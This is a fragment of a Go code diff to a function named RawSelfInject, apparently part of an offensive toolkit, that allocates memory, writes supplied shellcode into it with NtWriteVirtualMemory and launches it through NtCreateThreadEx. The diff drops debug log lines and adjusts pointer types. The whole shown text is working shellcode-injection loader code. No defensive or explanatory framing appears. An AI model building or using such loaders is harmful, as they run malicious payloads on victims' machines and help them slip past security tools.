@@ -258,13 +258,11 @@ func RawSelfInject(shellcode []byte) (string, error) {
 	if baseA == 0 {
 		return "", err
 	}
-	log.Println("past alloc")
-	var written uintptr
-	err2 := rawapi.NtWriteVirtualMemory(rawapi.ThisThread, baseA, &shellcode[0], uintptr(len(shellcode)), &written)
+	var written uint32
+	err2 := rawapi.NtWriteVirtualMemory(rawapi.ThisThread, baseA, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &written)
 	if err2 != nil {
 		return "", err2
 	}
-	log.Println("past write")
 	var hhosthread uintptr
 	err3 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
 		&hhosthread,       //hthread
